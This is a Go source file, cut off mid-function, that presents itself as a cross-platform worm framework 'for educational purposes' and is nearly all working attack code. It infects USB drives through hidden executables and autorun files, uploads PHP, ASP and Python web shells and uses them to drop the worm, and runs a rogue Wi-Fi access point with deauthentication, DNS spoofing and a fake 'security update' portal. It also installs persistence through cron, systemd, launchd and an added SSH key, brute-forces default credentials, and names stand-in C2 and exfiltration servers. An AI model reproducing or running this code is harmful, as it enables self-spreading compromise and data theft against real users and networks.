// worm.go - Complete Worm Framework - Cross-Platform (Windows/Linux/macOS/ARM)
// EDUCATIONAL PURPOSE ONLY 
// DEFCON 34 - Advanced Malware Research

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"database/sql"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/miekg/dns"
	_ "github.com/go-sql-driver/mysql"
	"golang.org/x/crypto/ssh"
)

// ========== CONSTANTS ==========

const (
	VERSION             = "4.0-DEFCON-ARM"
	MULTICAST_ADDR      = "239.255.42.42:4242"
	C2_WEBSOCKET        = "wss://c2-server.example.com:8443/ws"
	C2_DNS_DOMAIN       = "c2-botnet.example.com"
	DATA_EXFIL_SERVER   = "https://exfil-server.example.com:8443/upload"
	MAX_POPULATION      = 100
	SCAN_TIMEOUT        = 2 * time.Second
	USB_POLL_INTERVAL   = 5 * time.Second
	WIFI_BEACON_SSID    = "Free_Public_WiFi"
	WIFI_EVIL_PORTAL_PORT = 8443
)

var (
	wormID     string
	wormMutex  sync.RWMutex
	dataBuffer chan ExfilData
)

// ========== DATA STRUCTURES ==========

type InstanceInfo struct {
	ID           string    `json:"id"`
	IP           string    `json:"ip"`
	Hostname     string    `json:"hostname"`
	OS           string    `json:"os"`
	Arch         string    `json:"arch"`
	LastSeen     time.Time `json:"last_seen"`
	Version      int       `json:"version"`
	Capabilities []string  `json:"capabilities"`
	Population   int       `json:"population"`
	Status       string    `json:"status"`
	Role         string    `json:"role"`
}

type ExfilData struct {
	WormID      string                 `json:"worm_id"`
	Timestamp   time.Time              `json:"timestamp"`
	DataType    string                 `json:"data_type"`
	Target      string                 `json:"target"`
	Data        interface{}            `json:"data"`
	Compression string                 `json:"compression"`
	Encrypted   bool                   `json:"encrypted"`
}

type C2Command struct {
	ID          string                 `json:"id"`
	Type        string                 `json:"type"`
	Target      string                 `json:"target"`
	Parameters  map[string]interface{} `json:"parameters"`
	Priority    int                    `json:"priority"`
	Timestamp   time.Time              `json:"timestamp"`
	Signature   string                 `json:"signature"`
}

type WebShell struct {
	Path     string
	Type     string
	Content  string
	Backdoor []string
}

// ========== USB PROPAGATION ==========

type USBPropagator struct {
	monitoredPaths []string
	infectedUSBs   map[string]bool
	mu             sync.Mutex
	autorunContent string
}

func NewUSBPropagator() *USBPropagator {
	return &USBPropagator{
		monitoredPaths: []string{},
		infectedUSBs:   make(map[string]bool),
		autorunContent: generateAutorunInf(),
	}
}

func generateAutorunInf() string {
	switch runtime.GOOS {
	case "windows":
		return `[AutoRun]
open=SystemUpdate.exe
action=Open folder to view files
shell\open\command=SystemUpdate.exe
shell\open\default=1
shellexecute=SystemUpdate.exe
UseAutoPlay=1
`
	case "darwin":
		return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Volumes/SystemUpdate/SystemUpdate.app/Contents/MacOS/SystemUpdate</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>`
	default:
		return `#!/bin/bash
# USB Auto-execution script
./system-update &
`
	}
}

func (usb *USBPropagator) StartMonitoring() {
	usb.monitorDrives()
	ticker := time.NewTicker(USB_POLL_INTERVAL)
	for range ticker.C {
		usb.monitorDrives()
	}
}

func (usb *USBPropagator) monitorDrives() {
	switch runtime.GOOS {
	case "windows":
		usb.monitorWindowsDrives()
	case "darwin":
		usb.monitorMacDrives()
	default:
		usb.monitorLinuxDrives()
	}
}

func (usb *USBPropagator) monitorWindowsDrives() {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		path := string(drive) + ":\\"
		if _, err := os.Stat(path); err == nil {
			usb.checkAndInfectUSB(path)
		}
	}
}

func (usb *USBPropagator) monitorMacDrives() {
	files, err := ioutil.ReadDir("/Volumes/")
	if err != nil {
		return
	}
	for _, f := range files {
		if f.IsDir() && !strings.HasPrefix(f.Name(), ".") {
			path := filepath.Join("/Volumes/", f.Name())
			usb.checkAndInfectUSB(path)
		}
	}
}

func (usb *USBPropagator) monitorLinuxDrives() {
	mountPoints := []string{"/media/", "/mnt/", "/run/media/"}
	for _, mp := range mountPoints {
		files, err := ioutil.ReadDir(mp)
		if err == nil {
			for _, f := range files {
				if f.IsDir() {
					path := filepath.Join(mp, f.Name())
					usb.checkAndInfectUSB(path)
				}
			}
		}
	}
	sdDirs, _ := filepath.Glob("/mnt/sd*")
	for _, path := range sdDirs {
		if info, err := os.Stat(path); err == nil && info.IsDir() {
			usb.checkAndInfectUSB(path)
		}
	}
}

func (usb *USBPropagator) checkAndInfectUSB(path string) {
	usb.mu.Lock()
	defer usb.mu.Unlock()
	if usb.infectedUSBs[path] {
		return
	}
	if usb.isRemovable(path) {
		usb.infectUSB(path)
		usb.infectedUSBs[path] = true
	}
}

func (usb *USBPropagator) isRemovable(path string) bool {
	switch runtime.GOOS {
	case "windows":
		return usb.isRemovableWindows(path)
	case "darwin":
		return strings.HasPrefix(path, "/Volumes/")
	default:
		return strings.HasPrefix(path, "/media/") ||
			strings.HasPrefix(path, "/mnt/") ||
			strings.HasPrefix(path, "/run/media/") ||
			strings.HasPrefix(path, "/mnt/sd")
	}
}

// Stub for Windows – always returns false on non-Windows
func (usb *USBPropagator) isRemovableWindows(path string) bool {
	return false
}

func (usb *USBPropagator) infectUSB(path string) {
	fmt.Printf("[USB] Infecting drive: %s\n", path)

	exe, _ := os.Executable()
	wormData, _ := ioutil.ReadFile(exe)

	switch runtime.GOOS {
	case "windows":
		usb.infectUSBWindows(path, wormData)
	case "darwin":
		usb.infectUSBMac(path, wormData)
	default:
		usb.infectUSBLinux(path, wormData)
	}

	fmt.Printf("[USB] Successfully infected %s\n", path)
}

func (usb *USBPropagator) infectUSBWindows(path string, wormData []byte) {
	destPath := filepath.Join(path, "SystemUpdate.exe")
	ioutil.WriteFile(destPath, wormData, 0755)

	autorunPath := filepath.Join(path, "autorun.inf")
	ioutil.WriteFile(autorunPath, []byte(usb.autorunContent), 0644)

	exec.Command("attrib", "+h", "+s", destPath).Run()
	exec.Command("attrib", "+h", "+s", autorunPath).Run()
	usb.createUSBLnk(path)
}

func (usb *USBPropagator) infectUSBMac(path string, wormData []byte) {
	appPath := filepath.Join(path, "SystemUpdate.app", "Contents", "MacOS")
	os.MkdirAll(appPath, 0755)
	destPath := filepath.Join(appPath, "SystemUpdate")
	ioutil.WriteFile(destPath, wormData, 0755)

	plistPath := filepath.Join(path, "SystemUpdate.app", "Contents", "Info.plist")
	plist := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>SystemUpdate</string>
    <key>CFBundleName</key>
    <string>SystemUpdate</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
</dict>
</plist>`
	ioutil.WriteFile(plistPath, []byte(plist), 0644)

	exec.Command("SetFile", "-a", "V", path+"/SystemUpdate.app").Run()
}

func (usb *USBPropagator) infectUSBLinux(path string, wormData []byte) {
	destPath := filepath.Join(path, ".system-update")
	ioutil.WriteFile(destPath, wormData, 0755)

	udevRule := fmt.Sprintf(`ACTION=="add", KERNEL=="sd*[!0-9]", ATTRS{removable}=="1", RUN+="%s"`, destPath)
	ioutil.WriteFile("/etc/udev/rules.d/99-usb-autorun.rules", []byte(udevRule), 0644)

	desktopContent := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=System Update
Exec=%s
Hidden=true
`, destPath)
	ioutil.WriteFile(filepath.Join(path, ".system-update.desktop"), []byte(desktopContent), 0644)
}

func (usb *USBPropagator) createUSBLnk(path string) {
	vbScript := fmt.Sprintf(`
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "%s\\System Update.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "%s\\SystemUpdate.exe"
oLink.WindowStyle = 7
oLink.IconLocation = "%%SystemRoot%%\\System32\\shell32.dll, 4"
oLink.Save
`, path, path)

	scriptPath := filepath.Join(path, "create_lnk.vbs")
	ioutil.WriteFile(scriptPath, []byte(vbScript), 0644)
	exec.Command("cscript", "//Nologo", scriptPath).Run()
	os.Remove(scriptPath)
}

// ========== WEB SHELL MANAGEMENT ==========

type WebShellManager struct {
	shells   []WebShell
	deployed map[string]bool
	mu       sync.Mutex
	client   *http.Client
}

func NewWebShellManager() *WebShellManager {
	return &WebShellManager{
		shells:   loadWebShells(),
		deployed: make(map[string]bool),
		client:   &http.Client{Timeout: 10 * time.Second},
	}
}

func loadWebShells() []WebShell {
	phpShell := `<?php
    if(isset($_REQUEST['cmd'])){
        system($_REQUEST['cmd']);
    }
    if(isset($_FILES['file'])){
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    }
    if(isset($_REQUEST['data'])){
        file_put_contents("exfil.dat", base64_decode($_REQUEST['data']), FILE_APPEND);
    }
    if(isset($_REQUEST['worm'])){
        $worm = base64_decode($_REQUEST['worm']);
        file_put_contents("system-update.php", $worm);
    }
    echo "OK";
    ?>`

	aspShell := `<%@ Page Language="Jscript"%>
    <% if(Request["cmd"] != null){
        var cmd = Request["cmd"];
        var p = System.Diagnostics.Process.GetProcessById(System.Diagnostics.Process.GetCurrentProcess().Id);
        var shell = p.MainModule.FileName;
        var o = System.Diagnostics.Process.Start(shell, "/c " + cmd);
        Response.Write(o.StandardOutput.ReadToEnd());
    }%>`

	pythonShell := `#!/usr/bin/env python
import cgi, subprocess, base64
form = cgi.FieldStorage()
if 'cmd' in form:
    print subprocess.check_output(form['cmd'].value, shell=True)
if 'worm' in form:
    open('system-update.py', 'w').write(base64.b64decode(form['worm'].value))
print "OK"`

	return []WebShell{
		{Path: "/wp-content/uploads/shell.php", Type: "PHP", Content: phpShell, Backdoor: []string{"/shell.php", "/backdoor.php"}},
		{Path: "/shell.aspx", Type: "ASP", Content: aspShell, Backdoor: []string{"/backdoor.aspx"}},
		{Path: "/cgi-bin/shell.py", Type: "PYTHON", Content: pythonShell, Backdoor: []string{"/cgi-bin/update.py"}},
	}
}

func (wsm *WebShellManager) DeployOnTarget(target string) bool {
	wsm.mu.Lock()
	if wsm.deployed[target] {
		wsm.mu.Unlock()
		return false
	}
	wsm.mu.Unlock()

	for _, shell := range wsm.shells {
		if wsm.uploadShell(target, shell) {
			wsm.mu.Lock()
			wsm.deployed[target] = true
			wsm.mu.Unlock()
			fmt.Printf("[WebShell] Deployed %s shell to %s\n", shell.Type, target)

			for _, backdoor := range shell.Backdoor {
				wsm.deployBackdoor(target, backdoor, shell.Content)
			}
			return true
		}
	}
	return false
}

func (wsm *WebShellManager) uploadShell(target string, shell WebShell) bool {
	fullURL := fmt.Sprintf("http://%s%s", target, shell.Path)

	methods := []func(string, WebShell) bool{
		wsm.uploadViaPUT,
		wsm.uploadViaPOST,
		wsm.uploadViaFTP,
		wsm.uploadViaWebDAV,
	}

	for _, method := range methods {
		if method(fullURL, shell) {
			return true
		}
	}
	return false
}

func (wsm *WebShellManager) uploadViaPUT(url string, shell WebShell) bool {
	req, err := http.NewRequest("PUT", url, strings.NewReader(shell.Content))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-httpd-php")

	resp, err := wsm.client.Do(req)
	if err == nil && resp.StatusCode == 200 {
		resp.Body.Close()
		return true
	}
	if resp != nil {
		resp.Body.Close()
	}
	return false
}

func (wsm *WebShellManager) uploadViaPOST(fullURL string, shell WebShell) bool {
	data := url.Values{}
	data.Set("action", "upload")
	data.Set("file", shell.Content)

	resp, err := wsm.client.PostForm(fullURL, data)
	if err == nil && (resp.StatusCode == 200 || resp.StatusCode == 302) {
		resp.Body.Close()
		return true
	}
	if resp != nil {
		resp.Body.Close()
	}
	return false
}

func (wsm *WebShellManager) uploadViaFTP(url string, shell WebShell) bool {
	parts := strings.SplitN(url, "/", 4)
	if len(parts) < 4 {
		return false
	}
	host := parts[2]
	path := "/" + parts[3]

	conn, err := net.Dial("tcp", host+":21")
	if err != nil {
		return false
	}
	defer conn.Close()

	fmt.Fprintf(conn, "USER anonymous\r\n")
	fmt.Fprintf(conn, "PASS anonymous\r\n")
	fmt.Fprintf(conn, "STOR %s\r\n", path)
	fmt.Fprintf(conn, "QUIT\r\n")
	return true
}

func (wsm *WebShellManager) uploadViaWebDAV(url string, shell WebShell) bool {
	req, err := http.NewRequest("PROPFIND", url, nil)
	if err != nil {
		return false
	}
	resp, err := wsm.client.Do(req)
	if err == nil && resp.StatusCode == 207 {
		return wsm.uploadViaPUT(url, shell)
	}
	if resp != nil {
		resp.Body.Close()
	}
	return false
}

func (wsm *WebShellManager) deployBackdoor(target, path, content string) {
	fullURL := fmt.Sprintf("http://%s%s", target, path)
	wsm.uploadViaPUT(fullURL, WebShell{Content: content})
}

func (wsm *WebShellManager) ExecuteCommand(target, shellPath, cmd string) string {
	fullURL := fmt.Sprintf("http://%s%s?cmd=%s", target, shellPath, url.QueryEscape(cmd))
	resp, err := wsm.client.Get(fullURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return string(body)
}

func (wsm *WebShellManager) PropagateViaWebShell(target, shellPath string) {
	exe, _ := os.Executable()
	wormData, _ := ioutil.ReadFile(exe)
	wormBase64 := base64.StdEncoding.EncodeToString(wormData)

	commands := []string{
		fmt.Sprintf("echo '%s' | base64 -d > /tmp/worm", wormBase64),
		"chmod +x /tmp/worm",
		"/tmp/worm &",
	}

	for _, cmd := range commands {
		wsm.ExecuteCommand(target, shellPath, cmd)
	}

	fmt.Printf("[WebShell] Propagated worm via %s\n", target)
}

// ========== WIFI PROPAGATION ==========

type WiFiPropagator struct {
	interfaceName string
	apSSID        string
	apChannel     int
	portalServer  *http.Server
	victims       map[string]time.Time
	mu            sync.Mutex
	dnsServer     *dns.Server
}

func NewWiFiPropagator() *WiFiPropagator {
	return &WiFiPropagator{
		apSSID:    WIFI_BEACON_SSID,
		apChannel: 6,
		victims:   make(map[string]time.Time),
	}
}

func (wp *WiFiPropagator) Start() {
	if !wp.hasWiFiCapability() {
		fmt.Println("[WiFi] No WiFi capability detected")
		return
	}

	go wp.startEvilPortal()
	go wp.startDNSSpoofing()

	switch runtime.GOOS {
	case "linux":
		go wp.startRogueAPLinux()
		go wp.deauthAttackLinux()
	case "darwin":
		go wp.startRogueAPMac()
		go wp.deauthAttackMac()
	default:
		fmt.Println("[WiFi] WiFi propagation not supported on this OS")
	}
}

func (wp *WiFiPropagator) hasWiFiCapability() bool {
	interfaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, iface := range interfaces {
		name := iface.Name
		if strings.Contains(name, "wlan") || strings.Contains(name, "wlp") ||
			strings.Contains(name, "en0") || strings.Contains(name, "awdl") {
			return true
		}
	}
	if runtime.GOARCH == "arm" || runtime.GOARCH == "arm64" {
		if _, err := os.Stat("/sys/class/net/wlan0"); err == nil {
			return true
		}
	}
	return false
}

func (wp *WiFiPropagator) startRogueAPLinux() {
	hostapdConf := fmt.Sprintf(`interface=%s
driver=nl80211
ssid=%s
hw_mode=g
channel=%d
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
`, wp.interfaceName, wp.apSSID, wp.apChannel)

	ioutil.WriteFile("/tmp/hostapd.conf", []byte(hostapdConf), 0644)
	exec.Command("hostapd", "/tmp/hostapd.conf").Start()

	dhcpConf := `interface=wlan0
dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
`
	ioutil.WriteFile("/tmp/dhcpd.conf", []byte(dhcpConf), 0644)
	exec.Command("dnsmasq", "-C", "/tmp/dhcpd.conf", "-d").Start()

	exec.Command("sysctl", "-w", "net.ipv4.ip_forward=1").Run()
	exec.Command("iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE").Run()

	fmt.Printf("[WiFi] Rogue AP '%s' started on Linux/ARM\n", wp.apSSID)
}

func (wp *WiFiPropagator) startRogueAPMac() {
	fmt.Println("[WiFi] macOS rogue AP requires manual setup or additional tools")
	fmt.Println("[WiFi] Consider using macOS Internet Sharing with custom SSID")
}

func (wp *WiFiPropagator) deauthAttackLinux() {
	go exec.Command("aireplay-ng", "-0", "0", "-a", "FF:FF:FF:FF:FF:FF", wp.interfaceName).Start()
}

func (wp *WiFiPropagator) deauthAttackMac() {
	fmt.Println("[WiFi] macOS deauth attacks require additional tools")
}

func (wp *WiFiPropagator) startEvilPortal() {
	http.HandleFunc("/", wp.portalHandler)
	http.HandleFunc("/connect", wp.connectHandler)
	http.HandleFunc("/download", wp.downloadHandler)

	wp.portalServer = &http.Server{
		Addr:         ":80",
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	go wp.portalServer.ListenAndServe()
	go http.ListenAndServeTLS(":443", "cert.pem", "key.pem", nil)
}

func (wp *WiFiPropagator) portalHandler(w http.ResponseWriter, r *http.Request) {
	clientIP := strings.Split(r.RemoteAddr, ":")[0]
	wp.mu.Lock()
	wp.victims[clientIP] = time.Now()
	wp.mu.Unlock()

	html := `<!DOCTYPE html>
<html>
<head><title>Free Public WiFi</title></head>
<body>
<h2>Welcome to Free Public WiFi</h2>
<p>To access the internet, please download and install our security update.</p>
<a href="/download">Download Security Update</a>
<p>This is required for compliance with network security policies.</p>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(html))
}

func (wp *WiFiPropagator) downloadHandler(w http.ResponseWriter, r *http.Request) {
	exe, _ := os.Executable()
	wormData, _ := ioutil.ReadFile(exe)

	filename := "SecurityUpdate"
	if runtime.GOOS == "windows" {
		filename += ".exe"
	} else if runtime.GOOS == "darwin" {
		filename += ".app"
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filename))
	w.Write(wormData)

	fmt.Printf("[WiFi] Worm downloaded by %s\n", r.RemoteAddr)
}

func (wp *WiFiPropagator) connectHandler(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "http://www.google.com", http.StatusFound)
}

func (wp *WiFiPropagator) startDNSSpoofing() {
	dns.HandleFunc(".", wp.dnsHandler)

	wp.dnsServer = &dns.Server{
		Addr: ":53",
		Net:  "udp",
	}

	go wp.dnsServer.ListenAndServe()
}

func (wp *WiFiPropagator) dnsHandler(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	for _, q := range r.Question {
		rr, _ := dns.NewRR(fmt.Sprintf("%s A 192.168.100.1", q.Name))
		m.Answer = append(m.Answer, rr)
	}

	w.WriteMsg(m)
}

// ========== PERSISTENCE ==========

type PersistenceManager struct {
	wormPath  string
	installed bool
}

func NewPersistenceManager() *PersistenceManager {
	exe, _ := os.Executable()
	return &PersistenceManager{
		wormPath:  exe,
		installed: false,
	}
}

func (pm *PersistenceManager) InstallAll() error {
	switch runtime.GOOS {
	case "windows":
		return pm.installWindows()
	case "darwin":
		return pm.installMacOS()
	default:
		return pm.installLinux()
	}
}

// Stub for Windows – does nothing on non-Windows
func (pm *PersistenceManager) installWindows() error {
	return nil
}

// Stub for Windows WMI – does nothing on non-Windows
func (pm *PersistenceManager) installWMI() {}

func (pm *PersistenceManager) installMacOS() error {
	launchAgentPath := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents", "com.apple.systemupdate.plist")
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`, pm.wormPath)

	ioutil.WriteFile(launchAgentPath, []byte(plist), 0644)
	exec.Command("launchctl", "load", launchAgentPath).Run()

	cronCmd := fmt.Sprintf("(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", pm.wormPath)
	exec.Command("bash", "-c", cronCmd).Run()

	pm.installed = true
	return nil
}

func (pm *PersistenceManager) installLinux() error {
	hasSystemd := pm.hasSystemd()

	cmd := exec.Command("crontab", "-l")
	output, _ := cmd.Output()
	currentCron := string(output)
	if !strings.Contains(currentCron, pm.wormPath) {
		newCron := currentCron + fmt.Sprintf("@reboot %s\n*/30 * * * * %s\n", pm.wormPath, pm.wormPath)
		cmd = exec.Command("crontab", "-")
		cmd.Stdin = strings.NewReader(newCron)
		cmd.Run()
	}

	if hasSystemd {
		serviceContent := fmt.Sprintf(`[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=%s
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target`, pm.wormPath)
		ioutil.WriteFile("/etc/systemd/system/system-update.service", []byte(serviceContent), 0644)
		exec.Command("systemctl", "enable", "system-update.service").Run()
		exec.Command("systemctl", "start", "system-update.service").Run()
	} else {
		rcLocal := "/etc/rc.local"
		if _, err := os.Stat(rcLocal); err == nil {
			content, _ := ioutil.ReadFile(rcLocal)
			if !strings.Contains(string(content), pm.wormPath) {
				newContent := strings.Replace(string(content), "exit 0", fmt.Sprintf("%s &\nexit 0", pm.wormPath), 1)
				ioutil.WriteFile(rcLocal, []byte(newContent), 0755)
			}
		}

		initScript := fmt.Sprintf(`#!/bin/sh
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    $network
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update
### END INIT INFO

case "$1" in
    start)
        %s &
        ;;
    stop)
        killall system-update
        ;;
    restart)
        $0 stop
        $0 start
        ;;
esac
exit 0
`, pm.wormPath)
		ioutil.WriteFile("/etc/init.d/system-update", []byte(initScript), 0755)
		exec.Command("update-rc.d", "system-update", "defaults").Run()
	}

	sshPath := filepath.Join(os.Getenv("HOME"), ".ssh", "authorized_keys")
	wormKey := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..."
	f, _ := os.OpenFile(sshPath, os.O_APPEND|os.O_WRONLY, 0600)
	if f != nil {
		defer f.Close()
		f.WriteString("\n" + wormKey + "\n")
	}

	pm.installed = true
	return nil
}

func (pm *PersistenceManager) hasSystemd() bool {
	_, err := os.Stat("/run/systemd/system")
	return err == nil
}

func (pm *PersistenceManager) copyFile(src, dst string) {
	source, _ := os.Open(src)
	defer source.Close()
	destination, _ := os.Create(dst)
	defer destination.Close()
	io.Copy(destination, source)
}

// ========== POPULATION MANAGEMENT ==========

type WormPopulation struct {
	instanceID      string
	peerCount       int
	maxPopulation   int
	knownInstances  map[string]InstanceInfo
	networkSegments map[string]int
	leader          bool
	mu              sync.RWMutex
}

func NewWormPopulation() *WormPopulation {
	return &WormPopulation{
		instanceID:      generateID(),
		maxPopulation:   MAX_POPULATION,
		knownInstances:  make(map[string]InstanceInfo),
		networkSegments: make(map[string]int),
		leader:          false,
	}
}

func (wp *WormPopulation) CoordinateWithPeers() {
	go wp.listenForPeers()
	wp.BroadcastPresence()
	if !wp.leader {
		wp.electLeader()
	}
}

func (wp *WormPopulation) BroadcastPresence() {
	info := InstanceInfo{
		ID:         wp.instanceID,
		IP:         getLocalIP(),
		Hostname:   getHostname(),
		OS:         runtime.GOOS,
		Arch:       runtime.GOARCH,
		LastSeen:   time.Now(),
		Version:    2,
		Population: len(wp.knownInstances),
		Status:     "ACTIVE",
	}
	data, _ := json.Marshal(info)
	addr, _ := net.ResolveUDPAddr("udp", MULTICAST_ADDR)
	conn, _ := net.DialUDP("udp", nil, addr)
	if conn != nil {
		defer conn.Close()
		conn.Write(data)
	}
}

func (wp *WormPopulation) listenForPeers() {
	addr, _ := net.ResolveUDPAddr("udp", MULTICAST_ADDR)
	conn, _ := net.ListenUDP("udp", addr)
	if conn == nil {
		return
	}
	defer conn.Close()

	buffer := make([]byte, 4096)
	for {
		n, _, err := conn.ReadFromUDP(buffer)
		if err != nil {
			continue
		}
		var info InstanceInfo
		if err := json.Unmarshal(buffer[:n], &info); err == nil {
			if info.ID != wp.instanceID {
				wp.mu.Lock()
				wp.knownInstances[info.ID] = info
				wp.mu.Unlock()
			}
		}
	}
}

func (wp *WormPopulation) electLeader() {
	var leaderID string
	wp.mu.RLock()
	for id := range wp.knownInstances {
		if leaderID == "" || id < leaderID {
			leaderID = id
		}
	}
	wp.mu.RUnlock()

	if wp.instanceID == leaderID {
		wp.leader = true
		fmt.Println("[*] Elected as leader")
		go wp.leaderTasks()
	} else if leaderID != "" {
		fmt.Printf("[*] Following leader: %s\n", leaderID)
	}
}

func (wp *WormPopulation) leaderTasks() {
	ticker := time.NewTicker(30 * time.Second)
	for range ticker.C {
		wp.assignScanTasks()
		wp.balancePopulation()
	}
}

func (wp *WormPopulation) assignScanTasks() {
	wp.mu.RLock()
	followers := make([]string, 0, len(wp.knownInstances))
	for id := range wp.knownInstances {
		if id != wp.instanceID {
			followers = append(followers, id)
		}
	}
	wp.mu.RUnlock()

	if len(followers) == 0 {
		return
	}

	cidrs := generateCIDRs()
	for i, follower := range followers {
		if i < len(cidrs) {
			task := Task{
				ID:       generateID(),
				Type:     "SCAN",
				Target:   cidrs[i],
				Priority: 1,
				Status:   "ASSIGNED",
			}
			wp.sendTaskToPeer(follower, task)
		}
	}
}

func (wp *WormPopulation) sendTaskToPeer(peerID string, task Task) {
	msg := WormMessage{
		Type:      "TASK",
		SenderID:  wp.instanceID,
		Timestamp: time.Now(),
		Payload:   task,
	}
	_, _ = json.Marshal(msg) // placeholder for actual network send
	fmt.Printf("[*] Assigned task %s to %s\n", task.ID, peerID)
}

func (wp *WormPopulation) balancePopulation() {
	for cidr, count := range wp.networkSegments {
		if count > 10 {
			fmt.Printf("[*] Overpopulation in %s (%d instances), redirecting\n", cidr, count)
		}
	}
}

// Stub for Windows mutex
func (wp *WormPopulation) checkWindowsMutex() bool {
	return false
}

func (wp *WormPopulation) DetectExistingInstances() int {
	var count int
	if runtime.GOOS == "windows" {
		if wp.checkWindowsMutex() {
			count++
		}
	} else {
		if _, err := os.Stat("/tmp/.system-update.lock"); err == nil {
			count++
		}
	}
	ports := []int{4242, 4243, 4444}
	for _, port := range ports {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 100*time.Millisecond)
		if err == nil {
			count++
			conn.Close()
		}
	}
	return count
}

func (wp *WormPopulation) DecideAction() string {
	localCount := wp.DetectExistingInstances()
	wp.mu.RLock()
	totalCount := len(wp.knownInstances)
	wp.mu.RUnlock()

	switch {
	case localCount == 0:
		return "FULL_INSTALL"
	case localCount == 1 && totalCount < wp.maxPopulation/2:
		return "SUPPLEMENT_PROPAGATION"
	case localCount > 1 && totalCount < wp.maxPopulation:
		return "COORDINATED_SCAN"
	case totalCount >= wp.maxPopulation:
		return "EXPAND_NETWORK"
	default:
		return "STEALTH_MODE"
	}
}

// ========== PROPAGATION ENGINE ==========

type Propagator struct {
	population *WormPopulation
	infected   map[string]bool
	mu         sync.Mutex
	sshCreds   []SSHCredential
}

type SSHCredential struct {
	User     string
	Password string
}

func NewPropagator(pop *WormPopulation) *Propagator {
	return &Propagator{
		population: pop,
		infected:   make(map[string]bool),
		sshCreds:   loadCommonCredentials(),
	}
}

func loadCommonCredentials() []SSHCredential {
	return []SSHCredential{
		{"root", ""},
		{"root", "root"},
		{"root", "123456"},
		{"root", "password"},
		{"admin", "admin"},
		{"ubuntu", "ubuntu"},
		{"pi", "raspberry"},
		{"oracle", "oracle"},
	}
}

func (p *Propagator) Start() {
	action := p.population.DecideAction()
	fmt.Printf("[*] Starting propagation with action: %s\n", action)

	switch action {
	case "FULL_INSTALL":
		p.aggressivePropagation()
	case "SUPPLEMENT_PROPAGATION":
		p.targetedPropagation()
	case "COORDINATED_SCAN":
		p.coordinatedScan()
	case "EXPAND_NETWORK":
		p.expandToNewNetworks()
	case "STEALTH_MODE":
		p.stealthPropagation()
	}
}

func (p *Propagator) aggressivePropagation() {
	go p.scanLocalNetwork()
	go p.sshPropagation()
	go p.smbPropagation()
	go p.webPropagation()
}

func (p *Propagator) scanLocalNetwork() {
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			p.scanCIDR(fmt.Sprintf("%s/24", ipnet.IP.Mask(ipnet.Mask).String()))
		}
	}
}

func (p *Propagator) scanCIDR(cidr string) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return
	}
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		if ip[3] == 0 || ip[3] == 255 {
			continue
		}
		target := ip.String()
		p.mu.Lock()
		if p.infected[target] {
			p.mu.Unlock()
			continue
		}
		p.mu.Unlock()

		ports := []int{22, 445, 80, 443, 3306, 5432}
		for _, port := range ports {
			if p.isPortOpen(target, port) {
